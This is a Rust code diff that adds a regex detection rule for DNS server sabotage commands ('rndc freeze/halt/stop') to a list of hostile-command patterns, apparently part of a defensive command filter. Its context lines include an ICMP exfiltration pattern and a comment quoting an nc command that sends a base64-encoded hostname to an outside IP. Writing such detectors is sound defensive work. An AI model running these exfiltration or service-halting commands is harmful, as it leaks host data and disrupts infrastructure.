@@ -779,6 +779,13 @@ pub(crate) static PAYLOAD_COMMAND_PATTERNS: LazyLock<Vec<(Regex, &'static str)>>
                 Regex::new(r"\bping\s+[^|\n]*-p[a-z]*\s*\$?\(?\$\(").expect("Invalid regex"),
                 "icmp payload exfiltration (ping -p with substitution)",
             ),
+            // DNS server control sabotage (wave-72: `rndc freeze` —
+            // zone freeze/halt/stop on a production resolver, never
+            // coding work).
+            (
+                Regex::new(r"\brndc\s+(-\w+\s+)*(freeze|halt|stop)\b").expect("Invalid regex"),
+                "dns server sabotage (rndc freeze/halt/stop)",
+            ),
             // nc with an stdin payload (wave-58: \`nc -w1 1.1.1.1 80
             // <<< 'GET /$(base64 < /etc/hostname) HTTP/1.0'\`) — the
             // pipe-anchored pattern needs a pipe BEFORE nc; a
